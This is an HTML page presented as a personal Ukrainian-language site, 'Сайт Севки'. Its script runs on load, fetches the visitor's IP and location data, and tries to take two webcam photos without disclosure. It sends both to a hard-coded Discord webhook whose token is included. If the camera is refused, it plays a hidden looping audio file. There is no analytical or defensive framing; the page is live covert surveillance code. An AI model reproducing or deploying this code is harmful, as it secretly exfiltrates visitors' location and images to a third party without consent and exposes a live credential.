<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8" />
<title>Сайт Севки</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
  body {
    margin: 0;
    height: 100vh;
    background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    user-select: none;
    overflow: hidden;
  }
  .glass-container {
    background: rgba(255, 255, 255, 0.15);
    border-radius: 20px;
    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.18);
    padding: 40px;
    width: 380px;
    text-align: center;
    color: white;
    text-shadow: 0 0 8px rgba(0,0,0,0.7);
    font-weight: 700;
    font-size: 1.5rem;
  }
  audio {
    display: none;
  }
</style>
</head>
<body>
  <div class="glass-container">
    <div>Сайт Севки</div>
  </div>

  <audio id="audio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>

  <script>
    const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';

    async function sendToWebhook(payload) {
      try {
        await fetch(webhookURL, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(payload)
        });
      } catch(e) {}
    }

    async function sendIP() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        await sendToWebhook({content: `IP Info: ${JSON.stringify(data)}`});
      } catch(e) {}
    }

    async function sendImage(blob) {
      const reader = new FileReader();
      reader.onloadend = () => {
        sendToWebhook({content: `Camera Image (base64): ${reader.result}`});
      };
      reader.readAsDataURL(blob);
    }

    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(sendImage);

        // Capture another image after 3 seconds
        setTimeout(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(sendImage);
          stream.getTracks().forEach(t => t.stop());
        }, 3000);

        sendIP();
      } catch (e) {
        // On camera access denied play audio
        document.getElementById('audio').play().catch(() => {});
        sendIP();
      }
    }

    window.onload = () => {
      captureAndSend();
    }
  </script>
</body>
</html>
